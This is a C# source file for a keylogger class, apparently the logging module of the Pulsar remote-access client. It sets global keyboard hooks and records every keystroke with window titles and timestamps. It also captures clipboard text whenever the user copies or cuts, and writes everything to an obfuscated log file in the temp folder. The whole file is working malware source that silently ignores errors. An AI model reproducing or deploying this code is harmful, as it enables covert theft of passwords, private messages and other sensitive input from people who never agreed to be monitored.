using Gma.System.MouseKeyHook;
using Pulsar.Client.Helper;
using Pulsar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace Pulsar.Client.Logging
{
    public class Keylogger : IDisposable
    {
        private readonly long _maxLogFileSize;
        private readonly Timer _flushTimer;
        private readonly StringBuilder _lineBuffer = new StringBuilder();
        private readonly object _syncLock = new object();
        private readonly IKeyboardMouseEvents _events;

        private string _currentWindow = "";
        private DateTime _lastWindowChange = DateTime.UtcNow;
        private readonly TimeSpan _windowChangeThreshold = TimeSpan.FromSeconds(1);

        private string _logFilePath;
        private bool _isFirstWrite = true;

        private readonly HashSet<Keys> _heldModifiers = new HashSet<Keys>();
        private readonly HashSet<Keys> _processedKeys = new HashSet<Keys>();

        private string _lastHeaderLine = "";

        public bool IsDisposed { get; private set; }

        // Names of windows whose titles change constantly and should be generalized
        private readonly string[] _dynamicTitleApps = new[]
        {
            "Notepad",
        };

        // ========== CLIPBOARD LOGGING ==========
        private string _lastClipboardText = "";
        private DateTime _lastClipboardLogTime = DateTime.MinValue;
        private const int MAX_CLIPBOARD_CHARS = 4096; // max snippet length
        private readonly TimeSpan _clipboardCooldown = TimeSpan.FromMilliseconds(1500);

        public Keylogger(double flushInterval, long maxLogFileSize)
        {
            _maxLogFileSize = maxLogFileSize;
            _logFilePath = GetLogFilePath();

            _events = Hook.GlobalEvents();

            _flushTimer = new Timer(flushInterval)
            {
                AutoReset = true
            };
            _flushTimer.Elapsed += TimerElapsed;
        }

        private string NormalizeWindowTitle(string raw)
        {
            if (string.IsNullOrEmpty(raw))
                return raw;

            foreach (var app in _dynamicTitleApps)
            {
                if (raw.IndexOf(app, StringComparison.OrdinalIgnoreCase) >= 0)
                    return app;   // Generalize ONLY these apps
            }

            return raw; // Keep full title for all other apps
        }

        public void Start()
        {
            Subscribe();
            _flushTimer.Start();
        }

        private void Subscribe()
        {
            _events.KeyDown += OnKeyDown;
            _events.KeyUp += OnKeyUp;
            _events.KeyPress += OnKeyPress;
        }

        private void Unsubscribe()
        {
            _events.KeyDown -= OnKeyDown;
            _events.KeyUp -= OnKeyUp;
            _events.KeyPress -= OnKeyPress;
        }

private void OnKeyDown(object sender, KeyEventArgs e)
{
    // Track window changes
    string rawTitle = NativeMethodsHelper.GetForegroundWindowTitle() ?? "Unknown Window";

    // Normalize dynamic titles
    string win = NormalizeWindowTitle(rawTitle);

    lock (_syncLock)
    {
        // -------- WINDOW CHANGE DETECTION --------
        bool windowChanged = !string.Equals(win, _currentWindow, StringComparison.Ordinal);

        if (windowChanged && DateTime.UtcNow - _lastWindowChange > _windowChangeThreshold)
        {
            // New actual window → flush all buffered content
            FlushLineBuffer();

            _currentWindow = win;
            _lastWindowChange = DateTime.UtcNow;

            // Reset stored header (forces new header line)
            _lastHeaderLine = "";
        }

        // -------- DUPLICATE WINDOW HEADER SUPPRESSION --------
        string header = $"[{DateTime.Now:HH:mm:ss}] {rawTitle} ||";

        if (_lastHeaderLine != header)
        {
            // Only write header when it's NOT a duplicate
            _lineBuffer.AppendLine(header);
            _lineBuffer.AppendLine();

            _lastHeaderLine = header;
        }
        // else → same header again, do not repeat it


        // -------- MODIFIER KEYS --------
        if (IsModifierKey(e.KeyCode))
        {
            _heldModifiers.Add(e.KeyCode);
            return;
        }

        // -------- SPECIAL KEYS & CLIPBOARD LOGGING --------
        if (!_processedKeys.Contains(e.KeyCode))
        {
            // Clipboard logging on Ctrl+C / Ctrl+X
            if (IsCtrlHeld() && (e.KeyCode == Keys.C || e.KeyCode == Keys.X))
            {
                Thread t = new Thread(() =>
                {
                    try
                    {
                        Thread.Sleep(5);
                        TryLogClipboard();
                    }
                    catch { }
                });

                t.SetApartmentState(ApartmentState.STA);
                t.IsBackground = true;
                t.Start();
            }

            _processedKeys.Add(e.KeyCode);
            HandleSpecialKey(e.KeyCode);
        }
    }
}

        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            lock (_syncLock)
            {
                // Only handle printable characters in KeyPress
                if (char.IsControl(e.KeyChar))
                    return;

                string mods = BuildModifierString();
                _lineBuffer.Append(mods + e.KeyChar);

                // Clear modifiers after typing a character
                _heldModifiers.Clear();
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            lock (_syncLock)
            {
                _heldModifiers.Remove(e.KeyCode);
                _processedKeys.Remove(e.KeyCode);
            }
        }

        private void HandleSpecialKey(Keys key)
        {
            string mods = BuildModifierString();
            string keyText = GetSpecialKeyText(key);

            if (!string.IsNullOrEmpty(keyText))
            {
                _lineBuffer.Append(mods + keyText);

                // Add space after certain special keys for readability
                if (keyText == "[Enter]")
                {
                    _lineBuffer.AppendLine();
                    FlushLineBuffer();
                }
                else if (ShouldAddSpaceAfter(key))
                {
                    _lineBuffer.Append(" ");
                }

                // Clear modifiers after special key
                _heldModifiers.Clear();
            }
        }

        private bool ShouldAddSpaceAfter(Keys key)
        {
            switch (key)
            {
                case Keys.Tab:
                case Keys.Escape:
                case Keys.Up:
                case Keys.Down:
                case Keys.Left:
                case Keys.Right:
                case Keys.F1:
                case Keys.F2:
                case Keys.F3:
                case Keys.F4:
                case Keys.F5:
                case Keys.F6:
                case Keys.F7:
                case Keys.F8:
                case Keys.F9:
                case Keys.F10:
                case Keys.F11:
                case Keys.F12:
                    return true;
                default:
                    return false;
            }
        }

        private string GetSpecialKeyText(Keys key)
        {
            switch (key)
            {
                case Keys.Enter: return "[Enter]";
                case Keys.Back: return "[Back]";
                case Keys.Tab: return "[Tab]";
                case Keys.Escape: return "[Esc]";
                case Keys.Delete: return "[Del]";
                case Keys.Up: return "[Up]";
                case Keys.Down: return "[Down]";
                case Keys.Left: return "[Left]";
                case Keys.Right: return "[Right]";
                case Keys.Space: return " "; // Space as actual space, not [Space]
                case Keys.F1: return "[F1]";
                case Keys.F2: return "[F2]";
                case Keys.F3: return "[F3]";
                case Keys.F4: return "[F4]";
                case Keys.F5: return "[F5]";
                case Keys.F6: return "[F6]";
                case Keys.F7: return "[F7]";
                case Keys.F8: return "[F8]";
                case Keys.F9: return "[F9]";
                case Keys.F10: return "[F10]";
                case Keys.F11: return "[F11]";
                case Keys.F12: return "[F12]";
                case Keys.F13: return "[F13]";
                case Keys.F14: return "[F14]";
                case Keys.F15: return "[F15]";
                case Keys.F16: return "[F16]";
                case Keys.F17: return "[F17]";
                case Keys.F18: return "[F18]";
                case Keys.F19: return "[F19]";
                case Keys.F20: return "[F20]";
                case Keys.F21: return "[F21]";
                case Keys.F22: return "[F22]";
                case Keys.F23: return "[F23]";
                case Keys.F24: return "[F24]";
                default: return null;
            }
        }

        private bool IsModifierKey(Keys k)
        {
            return k == Keys.LShiftKey || k == Keys.RShiftKey ||
                   k == Keys.LControlKey || k == Keys.RControlKey ||
                   k == Keys.LMenu || k == Keys.RMenu ||
                   k == Keys.ShiftKey || k == Keys.ControlKey || k == Keys.Menu;
        }

        private bool IsCtrlHeld()
        {
            return _heldModifiers.Contains(Keys.ControlKey)
                || _heldModifiers.Contains(Keys.LControlKey)
                || _heldModifiers.Contains(Keys.RControlKey);
        }

        private string BuildModifierString()
        {
            if (_heldModifiers.Count == 0)
                return "";

            // Ignore only-Shift for printable characters
            if (_heldModifiers.Count == 1 &&
                (_heldModifiers.Contains(Keys.LShiftKey) || _heldModifiers.Contains(Keys.RShiftKey) ||
                 _heldModifiers.Contains(Keys.ShiftKey)))
            {
                return "";
            }

            StringBuilder sb = new StringBuilder();
            foreach (var m in _heldModifiers)
            {
                // Skip Shift — it’s not a meaningful modifier for logging unless combined with others
                if (m == Keys.LShiftKey || m == Keys.RShiftKey || m == Keys.ShiftKey)
                    continue;

                string modName = m.ToString()
                    .Replace("L", "")
                    .Replace("R", "")
                    .Replace("Key", "")
                    .Replace("Control", "Ctrl")
                    .Replace("Menu", "Alt");

                if (!string.IsNullOrEmpty(modName))
                    sb.Append($"[{modName}]");
            }

            return sb.ToString();
        }

        private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            try { FlushLineBuffer(); } catch { }
        }

        private void FlushLineBuffer()
        {
            lock (_syncLock)
            {
                if (_lineBuffer.Length == 0) return;

                string content = _lineBuffer.ToString();
                _lineBuffer.Clear();

                content = System.Text.RegularExpressions.Regex.Replace(content, @"[ ]{2,}", " ");

                WriteToFile(content);
            }
        }

        private void WriteToFile(string content)
        {
            if (string.IsNullOrWhiteSpace(content)) return;

            try
            {
                FileHelper.WriteObfuscatedLogFile(_logFilePath, content);

                if (new FileInfo(_logFilePath).Length > _maxLogFileSize)
                    RotateLogFile();

                _isFirstWrite = false;
            }
            catch { }
        }

        private void RotateLogFile()
        {
            try
            {
                string baseName = DateTime.UtcNow.ToString("yyyy-MM-dd");
                string basePath = Path.Combine(Path.GetTempPath(), baseName);
                string newFilePath = basePath + ".txt";

                int n = 1;
                while (File.Exists(newFilePath))
                {
                    newFilePath = $"{basePath}_{n:00}.txt";
                    n++;
                }

                _logFilePath = newFilePath;
                _isFirstWrite = true;
            }
            catch { }
        }

        private string GetLogFilePath()
        {
            return Path.Combine(Path.GetTempPath(), DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
        }

        // ========== CLIPBOARD LOGIC ==========
        private void TryLogClipboard()
        {
            try
            {
                if (!Clipboard.ContainsText())
                    return;

                string text = Clipboard.GetText()?.Trim();
                if (string.IsNullOrWhiteSpace(text))
                    return;

                if (text.Length > MAX_CLIPBOARD_CHARS)
                    return;

                if (text == _lastClipboardText)
                    return;

                if (DateTime.UtcNow - _lastClipboardLogTime < _clipboardCooldown)
                    return;

                _lastClipboardLogTime = DateTime.UtcNow;
                _lastClipboardText = text;

                lock (_syncLock)
                {
                    _lineBuffer.AppendLine($"[{DateTime.Now:HH:mm:ss}] Clipboard Copied ||");
                    _lineBuffer.AppendLine(text);
                    _lineBuffer.AppendLine();
                    FlushLineBuffer();
                }
            }
            catch
            {
                // Clipboard often throws when another process locks it; ignore
            }
        }

        public void FlushImmediately() => FlushLineBuffer();

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (IsDisposed) return;

            if (disposing)
            {
                FlushLineBuffer();
                Unsubscribe();
                _flushTimer.Stop();
                _flushTimer.Dispose();
                _events.Dispose();
            }

            IsDisposed = true;
        }
    }
}
